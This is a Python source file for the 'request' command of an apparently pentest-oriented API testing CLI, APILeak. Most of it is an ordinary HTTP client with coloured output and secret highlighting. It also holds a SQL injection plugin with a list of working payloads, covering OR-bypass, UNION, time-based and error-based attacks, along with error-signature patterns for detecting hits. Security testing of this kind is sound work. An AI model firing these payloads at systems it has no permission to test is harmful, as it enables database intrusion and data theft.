"""
cli.commands.request_cmd -- Single-shot HTTP request command.

Sends a single arbitrary HTTP request and prints a rich, coloured
request/response dump -- like curl or httpie, but integrated into the
APILeak toolchain with the same proxy, auth, and TLS options used by
every other command.

Registered under two names in ``apileaks.py``:
    cli.add_command(request_cmd, name="request")
    cli.add_command(request_cmd, name="req")
"""

from __future__ import annotations

import asyncio
import json
import re
import sys
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import click

from cli.parsers import parse_header_options, validate_header_options
from core.logging import get_logger

logger = get_logger(__name__)

# ---------------------------------------------------------------------------
# ANSI colour constants
# ---------------------------------------------------------------------------
_RESET   = "\033[0m"
_BOLD    = "\033[1m"
_CYAN    = "\033[96m"
_GREEN   = "\033[92m"
_YELLOW  = "\033[93m"
_RED     = "\033[91m"
_GRAY    = "\033[90m"
_MAGENTA = "\033[95m"
_BLUE    = "\033[94m"
_WHITE   = "\033[97m"

# ---------------------------------------------------------------------------
# Default keywords to highlight in response bodies (security-relevant fields)
# Colour: bold magenta -- not configurable by the user, just the keyword list.
# ---------------------------------------------------------------------------
DEFAULT_HIGHLIGHT_KEYWORDS: frozenset[str] = frozenset({
    "token", "access_token", "refresh_token", "id_token", "auth_token",
    "password", "passwd", "pass", "secret", "api_key", "apikey", "api_secret",
    "mfa", "otp", "totp", "code", "auth", "session", "session_id",
    "bearer", "jwt", "credential", "credentials", "key", "private_key",
    "client_secret", "client_id", "private", "hash", "salt", "pin",
})

# ---------------------------------------------------------------------------
# SQL injection plugin -- payloads and error indicators
# ---------------------------------------------------------------------------
SQLI_PAYLOADS: list[dict[str, str]] = [
    # Basic OR bypass
    {"payload": "' OR '1'='1",                 "label": "OR true (single quote)"},
    {"payload": "' OR '1'='1'--",              "label": "OR true + comment"},
    {"payload": "' OR 1=1--",                  "label": "OR 1=1 comment"},
    {"payload": "\" OR \"1\"=\"1",             "label": "OR true (double quote)"},
    {"payload": "' OR 1=1#",                   "label": "OR 1=1 hash comment"},
    {"payload": "1 OR 1=1",                    "label": "numeric OR bypass"},
    # Admin bypass
    {"payload": "admin'--",                    "label": "admin comment bypass"},
    {"payload": "' OR 1=1 LIMIT 1--",          "label": "OR limit 1"},
    # UNION probes
    {"payload": "' UNION SELECT NULL--",       "label": "UNION 1 col"},
    {"payload": "' UNION SELECT NULL,NULL--",  "label": "UNION 2 cols"},
    {"payload": "' UNION SELECT NULL,NULL,NULL--", "label": "UNION 3 cols"},
    # Blind time-based (MySQL)
    {"payload": "' AND SLEEP(2)--",            "label": "MySQL SLEEP(2)"},
    {"payload": "1; SELECT IF(1=1,SLEEP(2),0)--", "label": "MySQL IF SLEEP"},
    # Blind boolean
    {"payload": "' AND 1=1--",                 "label": "blind AND true"},
    {"payload": "' AND 1=2--",                 "label": "blind AND false"},
    # Error-based
    {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "label": "MySQL extractvalue"},
    {"payload": "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "label": "MySQL GROUP BY error"},
]

# Patterns in response that indicate SQLi hit
SQLI_ERROR_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"you have an error in your sql syntax", re.IGNORECASE),
    re.compile(r"warning:\s+mysql", re.IGNORECASE),
    re.compile(r"unclosed quotation mark", re.IGNORECASE),
    re.compile(r"quoted string not properly terminated", re.IGNORECASE),
    re.compile(r"syntax error", re.IGNORECASE),
    re.compile(r"mysql_fetch", re.IGNORECASE),
    re.compile(r"pg_query\(\)", re.IGNORECASE),
    re.compile(r"PSQLException", re.IGNORECASE),
    re.compile(r"ORA-\d{5}", re.IGNORECASE),
    re.compile(r"Microsoft OLE DB Provider for SQL Server", re.IGNORECASE),
    re.compile(r"Incorrect syntax near", re.IGNORECASE),
    re.compile(r"SQLite3::", re.IGNORECASE),
    re.compile(r"sqlite_step", re.IGNORECASE),
    re.compile(r"JDBC SQL Exception", re.IGNORECASE),
    re.compile(r"Caused by: java.sql", re.IGNORECASE),
    re.compile(r"\bpdoexception\b", re.IGNORECASE),
]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _status_color(code: int) -> str:
    if 200 <= code < 300:
        return _GREEN
    if 300 <= code < 400:
        return _YELLOW
    if 400 <= code < 500:
        return _GRAY
    if 500 <= code < 600:
        return _RED
    return _RESET


def _parse_fields(fields: tuple[str, ...]) -> dict[str, Any]:
    """Parse httpie-style KEY=VALUE and KEY:=RAWJSON pairs into a body dict."""
    result: dict[str, Any] = {}
    for field in fields:
        if ":=" in field:
            key, _, raw = field.partition(":=")
            try:
                result[key.strip()] = json.loads(raw.strip())
            except json.JSONDecodeError:
                result[key.strip()] = raw.strip()
        elif "=" in field:
            key, _, value = field.partition("=")
            result[key.strip()] = value
        else:
            raise click.BadParameter(
                f"Invalid field {field!r}. "
                "Use key=value (string) or key:=rawjson (typed value).",
                param_hint="FIELDS",
            )
    return result


def _parse_kvpairs(pairs: tuple[str, ...], option_name: str) -> dict[str, str]:
    result: dict[str, str] = {}
    for p in pairs:
        if "=" in p:
            k, _, v = p.partition("=")
            result[k.strip()] = v
        else:
            raise click.BadParameter(
                f"Invalid {option_name} {p!r}. Use key=value.",
                param_hint=option_name,
            )
    return result


def _highlight_keywords(text: str, keywords: frozenset[str]) -> str:
    """Wrap JSON key names matching security keywords with bold magenta colour.

    Works on the already-formatted JSON string so indentation is preserved.
    Only highlights the key name (before the colon) -- not the value --
    so sensitive values aren't accidentally masked or truncated.
    """
    result = text
    for kw in keywords:
        # Match: "keyword": -- the JSON key followed by a colon
        # Uses word-boundary-like anchor with quote chars to avoid partial matches.
        result = re.sub(
            rf'("{re.escape(kw)}")(\s*:)',
            lambda m: f'{_BOLD}{_MAGENTA}{m.group(1)}{_RESET}{m.group(2)}',
            result,
            flags=re.IGNORECASE,
        )
    return result


# ---------------------------------------------------------------------------
# Coloured request/response dump
# ---------------------------------------------------------------------------

def _print_request_dump(
    *,
    method: str,
    url: str,
    req_headers: dict[str, str],
    req_body: Any | None,
    req_params: dict[str, str] | None,
    status: int,
    resp_headers: dict[str, str],
    resp_body: str,
    elapsed: float,
    highlight_keywords: frozenset[str] = DEFAULT_HIGHLIGHT_KEYWORDS,
) -> None:
    """Print a coloured request/response dump to stdout."""
    sep  = "─" * 60
    wide = "═" * 60

    # ── REQUEST ──────────────────────────────────────────────────────────
    click.echo(f"\n{_BOLD}{_CYAN}{wide}")
    click.echo("  HTTP REQUEST")
    click.echo(f"{wide}{_RESET}")

    parsed = urlparse(url)
    path = parsed.path or "/"
    qs = f"?{parsed.query}" if parsed.query else ""
    if req_params:
        extra = "&".join(f"{k}={v}" for k, v in req_params.items())
        qs = (qs + "&" + extra) if qs else ("?" + extra)
    click.echo(f"{_BOLD}{_MAGENTA}{method}{_RESET} {path}{qs}  {_GRAY}HTTP/1.1{_RESET}")
    click.echo(f"{_GRAY}Host: {parsed.netloc}{_RESET}")

    for name, value in sorted(req_headers.items()):
        if name.lower() == "host":
            continue
        if name.lower() == "authorization":
            parts = value.split(" ", 1)
            token_preview = (
                parts[1][:16] + "..."
                if len(parts) > 1 and len(parts[1]) > 16
                else (parts[1] if len(parts) > 1 else "")
            )
            click.echo(f"{_GRAY}{name}: {parts[0]} {token_preview}{_RESET}")
        else:
            click.echo(f"{_GRAY}{name}: {value}{_RESET}")

    if req_body:
        click.echo()
        body_str = (
            json.dumps(req_body, indent=2, ensure_ascii=False)
            if isinstance(req_body, dict)
            else str(req_body)
        )
        click.echo(_highlight_keywords(body_str, highlight_keywords))

    # ── RESPONSE ─────────────────────────────────────────────────────────
    col = _status_color(status)
    click.echo(f"\n{_BOLD}{_CYAN}{sep}")
    click.echo("  RESPONSE")
    click.echo(f"{sep}{_RESET}")
    click.echo(f"{col}{_BOLD}HTTP/1.1 {status}{_RESET}  {_GRAY}({elapsed:.3f}s){_RESET}")

    SKIP_HEADERS = {"transfer-encoding", "connection"}
    content_type = ""
    for name, value in sorted(resp_headers.items()):
        if name.lower() in SKIP_HEADERS:
            continue
        if name.lower() == "content-type":
            content_type = value
        click.echo(f"{_GRAY}{name}: {value}{_RESET}")

    click.echo()
    MAX_BODY = 8192
    body_to_show = resp_body[:MAX_BODY] if resp_body else ""
    truncated    = len(resp_body or "") > MAX_BODY

    is_json = "json" in content_type.lower()
    if not is_json and body_to_show and body_to_show.strip().startswith(("{", "[")):
        is_json = True

    if is_json:
        try:
            raw = resp_body if not truncated else resp_body[:MAX_BODY]
            pretty = json.dumps(json.loads(raw), indent=2, ensure_ascii=False)
            # Apply keyword highlighting before printing
            click.echo(_highlight_keywords(pretty, highlight_keywords))
        except (json.JSONDecodeError, ValueError):
            click.echo(_highlight_keywords(body_to_show, highlight_keywords))
    else:
        click.echo(_highlight_keywords(body_to_show, highlight_keywords))

    if truncated:
        click.echo(
            f"\n{_YELLOW}... body truncated -- showing {MAX_BODY} of "
            f"{len(resp_body)} bytes total{_RESET}"
        )

    click.echo(f"{_BOLD}{_CYAN}{wide}{_RESET}\n")


def _print_scan_results(secrets: list, url: str, method: str) -> None:
    if not secrets:
        click.echo(f"{_GREEN}[✓] Secret scan: no patterns matched in the response.{_RESET}")
        return
    click.echo(f"\n{_BOLD}{_RED}{'━' * 60}")
    click.echo(f"  SECRET SCAN -- {len(secrets)} match(es) found")
    click.echo(f"{'━' * 60}{_RESET}")
    for s in secrets:
        click.echo(
            f"  {_RED}▶{_RESET} {_BOLD}{s.pattern_name}{_RESET}  "
            f"redacted: {_YELLOW}{s.redacted}{_RESET}"
        )
    click.echo(
        f"\n{_YELLOW}⚠  Sensitive data detected. "
        f"Review the endpoint's access controls.{_RESET}\n"
    )


# ---------------------------------------------------------------------------
# Async request execution
# ---------------------------------------------------------------------------

async def _execute_request(
    method: str,
    url: str,
    *,
    headers: dict[str, str],
    json_body: dict[str, Any] | None,
    form_data: dict[str, str] | None,
    raw_body: str | None,
    params: dict[str, str],
    proxy: str | None,
    verify_ssl: bool,
    timeout: float,
    follow_redirects: bool,
) -> dict[str, Any]:
    """Send one HTTP request and return a result dict."""
    from core.config import RateLimitConfig
    from utils.http_client import HTTPRequestEngine, RateLimiter, RetryConfig

    rate_limiter = RateLimiter(RateLimitConfig(requests_per_second=1000, burst_size=1000))
    retry_cfg    = RetryConfig(max_attempts=1)
    eff_verify   = False if proxy else verify_ssl

    engine = HTTPRequestEngine(
        rate_limiter=rate_limiter,
        retry_config=retry_cfg,
        timeout=timeout,
        verify_ssl=eff_verify,
        proxy=proxy,
        default_headers=headers,
        follow_redirects=follow_redirects,
    )

    req_kwargs: dict[str, Any] = {}
    if params:
        req_kwargs["params"] = params
    if json_body is not None:
        req_kwargs["json"] = json_body
    elif form_data is not None:
        req_kwargs["data"] = form_data
    elif raw_body is not None:
        req_kwargs["data"] = raw_body.encode()

    try:
        async with engine:
            response = await engine.request(method.upper(), url, **req_kwargs)
    except Exception as exc:
        raise click.ClickException(f"Request failed: {type(exc).__name__}: {exc}") from exc

    return {
        "method": method.upper(),
        "url": url,
        "request_headers": dict(headers),
        "request_body": json_body or form_data,
        "status_code": response.status_code,
        "response_headers": dict(response.headers),
        "response_body": response.text,
        "elapsed": float(response.elapsed),
    }


# ---------------------------------------------------------------------------
# SQL injection plugin
# ---------------------------------------------------------------------------

def _inject_param(url: str, params: dict[str, str], param_name: str, value: str) -> tuple[str, dict[str, str]]:
    """Return (new_url, new_params_dict) with param_name replaced by value.

    Handles parameters both in the URL query string and in the explicit
    params dict so either source works correctly.
    """
    parsed    = urlparse(url)
    qs_params = parse_qs(parsed.query, keep_blank_values=True)

    new_params = dict(params)
    new_qs     = {k: v for k, v in qs_params.items()}

    if param_name in new_qs:
        new_qs[param_name] = [value]
        new_query = urlencode({k: v[0] for k, v in new_qs.items()})
        new_url = urlunparse(parsed._replace(query=new_query))
        return new_url, new_params

    if param_name in new_params:
        new_params[param_name] = value
        return url, new_params

    # Parameter not found in either location -- add to query string
    new_qs[param_name] = [value]
    new_query = urlencode({k: v[0] for k, v in new_qs.items()})
    new_url   = urlunparse(parsed._replace(query=new_query))
    return new_url, new_params


def _check_sqli_indicators(body: str) -> list[str]:
    """Return list of matched error pattern labels for the response body."""
    return [p.pattern for p in SQLI_ERROR_PATTERNS if p.search(body)]


async def _run_sqli_plugin(
    *,
    method: str,
    url: str,
    headers: dict[str, str],
    json_body: dict[str, Any] | None,
    params: dict[str, str],
    proxy: str | None,
    verify_ssl: bool,
    timeout: float,
    follow_redirects: bool,
    parameters: list[str],
    baseline_body: str,
    baseline_status: int,
    baseline_length: int,
) -> None:
    """Run SQL injection payloads against the specified parameters and print results."""

    click.echo(f"\n{_BOLD}{_CYAN}{'═' * 60}")
    click.echo("  SQL INJECTION PLUGIN")
    click.echo(f"  Parameters: {', '.join(parameters)}")
    click.echo(f"  Payloads:   {len(SQLI_PAYLOADS)}")
    click.echo(f"{'═' * 60}{_RESET}\n")

    # Table header
    click.echo(
        f"{_BOLD}{'PARAM':<18} {'PAYLOAD':<42} {'STATUS':<7} {'LEN':>6} {'DIFF':>6} {'RESULT'}{_RESET}"
    )
    click.echo("─" * 100)

    findings: list[dict[str, Any]] = []

    for param in parameters:
        for entry in SQLI_PAYLOADS:
            payload = entry["payload"]
            label   = entry["label"]

            inj_url, inj_params = _inject_param(url, params, param, payload)

            # Inject into JSON body if param is a body field
            inj_body = None
            if json_body and param in json_body:
                inj_body = dict(json_body)
                inj_body[param] = payload
            else:
                inj_body = json_body

            try:
                result = await _execute_request(
                    method,
                    inj_url,
                    headers=headers,
                    json_body=inj_body,
                    form_data=None,
                    raw_body=None,
                    params=inj_params,
                    proxy=proxy,
                    verify_ssl=verify_ssl,
                    timeout=timeout,
                    follow_redirects=follow_redirects,
                )
            except click.ClickException:
                click.echo(f"{_RED}  {param:<18} {label:<42} ERROR{_RESET}")
                continue

            resp_status = result["status_code"]
            resp_body   = result["response_body"]
            resp_len    = len(resp_body)
            len_diff    = resp_len - baseline_length
            status_diff = resp_status != baseline_status

            # Determine if this looks like a hit
            error_patterns = _check_sqli_indicators(resp_body)
            len_anomaly    = abs(len_diff) > 50  # response size changed significantly
            status_anomaly = status_diff

            is_hit = bool(error_patterns) or (len_anomaly and resp_status < 500)
            is_possible = not is_hit and len_anomaly

            if is_hit:
                result_label = f"{_BOLD}{_RED}POSSIBLE HIT ⚠{_RESET}"
                findings.append({
                    "param": param,
                    "payload": payload,
                    "label": label,
                    "status": resp_status,
                    "length": resp_len,
                    "diff": len_diff,
                    "indicators": error_patterns,
                    "body_snippet": resp_body[:300],
                })
            elif is_possible:
                result_label = f"{_YELLOW}ANOMALY{_RESET}"
            else:
                result_label = f"{_GRAY}ok{_RESET}"

            # Status colour
            sc = _status_color(resp_status)
            diff_col = _YELLOW if len_diff != 0 else _GRAY
            diff_str = f"{len_diff:+d}" if len_diff != 0 else "0"

            # Truncate param and label for table alignment
            param_disp = param[:17]
            label_disp = label[:41]

            click.echo(
                f"  {param_disp:<18} {label_disp:<42} "
                f"{sc}{resp_status:<7}{_RESET} "
                f"{_GRAY}{resp_len:>6}{_RESET} "
                f"{diff_col}{diff_str:>6}{_RESET} "
                f"{result_label}"
            )

    # Summary
    click.echo(f"\n{_BOLD}{'─' * 60}{_RESET}")
    if findings:
        click.echo(f"\n{_BOLD}{_RED}  ⚠  {len(findings)} potential SQLi finding(s) detected:{_RESET}\n")
        for i, f in enumerate(findings, 1):
            click.echo(f"  {_BOLD}[{i}]{_RESET} Parameter: {_MAGENTA}{f['param']}{_RESET}")
            click.echo(f"      Payload:   {f['payload']}")
            click.echo(f"      Status:    {f['status']}  |  Length: {f['length']}  |  Diff: {f['diff']:+d}")
            if f["indicators"]:
                click.echo(f"      Errors:    {_RED}{'; '.join(f['indicators'][:2])}{_RESET}")
            click.echo(f"      Snippet:   {_GRAY}{f['body_snippet'][:120].replace(chr(10), ' ')}{_RESET}")
            click.echo()
    else:
        click.echo(f"\n{_GREEN}  [✓] No obvious SQL injection indicators detected.{_RESET}")
        click.echo(f"      {_GRAY}(Manual review recommended for blind injection scenarios){_RESET}\n")


# ---------------------------------------------------------------------------
# Session persistence
# ---------------------------------------------------------------------------

def _save_to_session(result: dict[str, Any], path: str) -> None:
    session_path = Path(path)
    if session_path.exists():
        try:
            session = json.loads(session_path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            session = {"findings": []}
    else:
        session = {"findings": []}

    session.setdefault("findings", []).append({
        "id": f"req-{len(session['findings']) + 1}",
        "scan_id": "manual_request",
        "category": "MANUAL_REQUEST",
        "severity": "INFO",
        "endpoint": result["url"],
        "method": result["method"],
        "status_code": result["status_code"],
        "response_size": len(result["response_body"] or ""),
        "response_time": result["elapsed"],
        "evidence": f"Manual {result['method']} request, status {result['status_code']}",
        "recommendation": "",
        "payload": json.dumps(result.get("request_body")) if result.get("request_body") else None,
        "metadata": {
            "headers": result["request_headers"],
            "response_headers": result["response_headers"],
        },
    })

    session_path.parent.mkdir(parents=True, exist_ok=True)
    session_path.write_text(json.dumps(session, indent=2, ensure_ascii=False), encoding="utf-8")
    click.echo(f"{_GRAY}[session] Saved to {session_path}{_RESET}", err=True)


# ---------------------------------------------------------------------------
# Click command
# ---------------------------------------------------------------------------

KNOWN_METHODS = {
    "GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE", "CONNECT",
}

SUPPORTED_PLUGINS = {"sqlinjection"}


@click.command("request")
@click.argument("method")
@click.argument("url")
@click.argument("fields", nargs=-1, metavar="[KEY=VALUE ...]")
# ── Body ──────────────────────────────────────────────────────────────────
@click.option("--json", "json_str", default=None, metavar="JSON",
              help="Request body as a JSON string. Sets Content-Type: application/json.")
@click.option("--form", "-F", "form_pairs", multiple=True, metavar="KEY=VALUE",
              help="Form field (repeatable). Sets Content-Type: application/x-www-form-urlencoded.")
@click.option("--raw", "raw_body", default=None, metavar="TEXT",
              help="Raw request body string.")
# ── Auth / headers ────────────────────────────────────────────────────────
@click.option("--header", "-H", "raw_headers", multiple=True, metavar="Name: Value",
              help="Extra request header (repeatable).")
@click.option("--jwt", "jwt_token", default=None, metavar="TOKEN",
              help="JWT/Bearer token -> Authorization: Bearer <token>.")
# ── Routing ───────────────────────────────────────────────────────────────
@click.option("--proxy", default=None, metavar="URL",
              help=(
                  "Intercepting proxy (Burp/Caido/Hetty/mitmproxy).\n"
                  "HTTP: --proxy http://127.0.0.1:8080\n"
                  "SOCKS5: --proxy socks5://127.0.0.1:9050\n"
                  "TLS verification is disabled automatically."
              ))
@click.option("--param", "-p", "raw_params", multiple=True, metavar="KEY=VALUE",
              help="Query-string parameter (repeatable).")
@click.option("--follow-redirects", is_flag=True, default=False,
              help="Follow HTTP 3xx redirects.")
@click.option("--no-verify", is_flag=True, default=False,
              help="Disable TLS certificate verification.")
@click.option("--timeout", type=float, default=30.0, show_default=True, metavar="SECS",
              help="Per-request timeout in seconds.")
# ── Output ────────────────────────────────────────────────────────────────
@click.option("--quiet", "-q", is_flag=True, default=False,
              help="Print only the response body (for piping).")
@click.option("--output", "-o",
              type=click.Choice(["text", "json"], case_sensitive=False),
              default="text", show_default=True,
              help="'text' -- coloured dump (default). 'json' -- machine-readable.")
@click.option("--highlight", "extra_highlights", multiple=True, metavar="WORD",
              help=(
                  "Extra keyword to highlight in the response body (repeatable). "
                  "Default keywords: token, password, mfa, code, secret, key, jwt, ..."
              ))
@click.option("--scan-response", is_flag=True, default=False,
              help="Scan response for leaked credentials/secrets.")
@click.option("--save-session", "save_session", default=None,
              type=click.Path(dir_okay=False, writable=True), metavar="FILE",
              help="Append to a replay session file (compatible with 'apileaks replay').")
@click.option("--fail-on-error", is_flag=True, default=False,
              help="Exit 1 on HTTP 4xx or 5xx response.")
# ── Plugins ───────────────────────────────────────────────────────────────
@click.option("--plugin", "plugin_name", default=None, metavar="NAME",
              type=click.Choice(["sqlinjection"], case_sensitive=False),
              help=(
                  "Run a named testing plugin after the initial request.\n"
                  "Available: sqlinjection"
              ))
@click.option("--parameters", "plugin_params", default=None, metavar="PARAM[,PARAM]",
              help=(
                  "Comma-separated list of parameters to target with --plugin.\n"
                  "Example: --plugin sqlinjection --parameters token,id,username"
              ))
@click.pass_context
def request_cmd(
    ctx,
    method: str,
    url: str,
    fields: tuple[str, ...],
    json_str: str | None,
    form_pairs: tuple[str, ...],
    raw_body: str | None,
    raw_headers: tuple[str, ...],
    jwt_token: str | None,
    proxy: str | None,
    raw_params: tuple[str, ...],
    follow_redirects: bool,
    no_verify: bool,
    timeout: float,
    quiet: bool,
    output: str,
    extra_highlights: tuple[str, ...],
    scan_response: bool,
    save_session: str | None,
    fail_on_error: bool,
    plugin_name: str | None,
    plugin_params: str | None,
) -> None:
    """Send a single HTTP request and display a coloured request/response dump.

    METHOD is the HTTP verb. URL is the full target URL.
    KEY=VALUE pairs build a JSON body (httpie-style).

    \b
    Examples:
      apileaks req GET  https://api.example.com/users
      apileaks req POST https://api.example.com/users --json '{"name":"alice"}'
      apileaks req POST https://api.example.com/users name=alice role=admin
      apileaks req PATCH https://api.example.com/users/42 \\
        --json '{"role":"admin"}' --proxy http://127.0.0.1:8080
      apileaks req GET  https://api.example.com/token --quiet | jq .access_token

    \b
    SQL injection testing:
      apileaks req GET "http://api.example.com/users?token=test" \\
        --plugin sqlinjection --parameters token
      apileaks req GET "http://api.example.com/search?q=test&id=1" \\
        --plugin sqlinjection --parameters q,id --proxy http://127.0.0.1:8080

    \b
    Keyword highlighting (default: token, password, mfa, code, secret, ...):
      apileaks req GET https://api.example.com/config
      apileaks req GET https://api.example.com/config --highlight flag --highlight admin_key
    """
    # ── Plugin validation ─────────────────────────────────────────────────
    if plugin_name and not plugin_params:
        raise click.UsageError(
            f"--plugin {plugin_name} requires --parameters PARAM[,PARAM]. "
            "Specify which parameters to test."
        )

    # ── Method normalisation ──────────────────────────────────────────────
    method = method.upper()
    if method not in KNOWN_METHODS:
        click.echo(
            f"{_YELLOW}⚠  '{method}' is not a standard HTTP method. Proceeding anyway.{_RESET}",
            err=True,
        )

    # ── URL normalisation ─────────────────────────────────────────────────
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
        if not quiet:
            click.echo(f"{_GRAY}[auto] Prefixed URL with https:// -> {url}{_RESET}", err=True)

    # ── Parse request components ──────────────────────────────────────────
    validate_header_options(raw_headers)
    extra_headers: dict[str, str] = parse_header_options(raw_headers)
    if jwt_token:
        extra_headers["Authorization"] = f"Bearer {jwt_token}"

    body_sources = sum([bool(json_str), bool(fields), bool(form_pairs), bool(raw_body)])
    if body_sources > 1:
        raise click.UsageError(
            "Conflicting body options: use only one of --json, KEY=VALUE fields, --form, or --raw."
        )

    json_body: dict[str, Any] | None = None
    form_data: dict[str, str] | None = None

    if json_str:
        try:
            json_body = json.loads(json_str)
        except json.JSONDecodeError as exc:
            raise click.BadParameter(f"--json is not valid JSON: {exc}", param_hint="--json") from exc
        extra_headers.setdefault("Content-Type", "application/json")
    elif fields:
        json_body = _parse_fields(fields)
        extra_headers.setdefault("Content-Type", "application/json")
    elif form_pairs:
        form_data = _parse_kvpairs(form_pairs, "--form")
        extra_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

    params: dict[str, str] = {}
    if raw_params:
        params = _parse_kvpairs(raw_params, "--param")

    # ── Keyword highlighting set ──────────────────────────────────────────
    highlight_kws = DEFAULT_HIGHLIGHT_KEYWORDS | frozenset(w.lower() for w in extra_highlights)

    # ── Execute main request ──────────────────────────────────────────────
    try:
        result = asyncio.run(
            _execute_request(
                method, url,
                headers=extra_headers,
                json_body=json_body,
                form_data=form_data,
                raw_body=raw_body,
                params=params,
                proxy=proxy,
                verify_ssl=not no_verify,
                timeout=timeout,
                follow_redirects=follow_redirects,
            )
        )
    except click.ClickException:
        raise
    except Exception as exc:
        raise click.ClickException(f"Unexpected error: {exc}") from exc

    # ── Display ───────────────────────────────────────────────────────────
    if quiet:
        click.echo(result["response_body"])

    elif output.lower() == "json":
        output_data: dict[str, Any] = {
            "method": result["method"],
            "url": result["url"],
            "status_code": result["status_code"],
            "elapsed": round(result["elapsed"], 4),
            "request": {
                "headers": result["request_headers"],
                "body": result["request_body"],
                "params": params,
            },
            "response": {
                "headers": result["response_headers"],
                "body": result["response_body"],
            },
        }
        if scan_response:
            from utils.secret_scanner import scan_for_secrets
            secrets = scan_for_secrets(
                body=result["response_body"],
                headers=result["response_headers"],
                endpoint=url,
                method=method,
            )
            output_data["secrets_found"] = [
                {"pattern": s.pattern_name, "redacted": s.redacted}
                for s in secrets
            ]
        click.echo(json.dumps(output_data, indent=2, ensure_ascii=False))

    else:
        _print_request_dump(
            method=result["method"],
            url=result["url"],
            req_headers=result["request_headers"],
            req_body=result["request_body"],
            req_params=params,
            status=result["status_code"],
            resp_headers=result["response_headers"],
            resp_body=result["response_body"],
            elapsed=result["elapsed"],
            highlight_keywords=highlight_kws,
        )
        if scan_response:
            from utils.secret_scanner import scan_for_secrets
            secrets = scan_for_secrets(
                body=result["response_body"],
                headers=result["response_headers"],
                endpoint=url,
                method=method,
            )
            _print_scan_results(secrets=secrets, url=url, method=method)

    # ── Save session ──────────────────────────────────────────────────────
    if save_session:
        _save_to_session(result, save_session)

    # ── Plugins ───────────────────────────────────────────────────────────
    if plugin_name and plugin_name.lower() == "sqlinjection":
        param_list = [p.strip() for p in (plugin_params or "").split(",") if p.strip()]
        asyncio.run(
            _run_sqli_plugin(
                method=method,
                url=url,
                headers=extra_headers,
                json_body=json_body,
                params=params,
                proxy=proxy,
                verify_ssl=not no_verify,
                timeout=timeout,
                follow_redirects=follow_redirects,
                parameters=param_list,
                baseline_body=result["response_body"],
                baseline_status=result["status_code"],
                baseline_length=len(result["response_body"] or ""),
            )
        )

    # ── Exit code ─────────────────────────────────────────────────────────
    if fail_on_error and result["status_code"] >= 400:
        sys.exit(1)
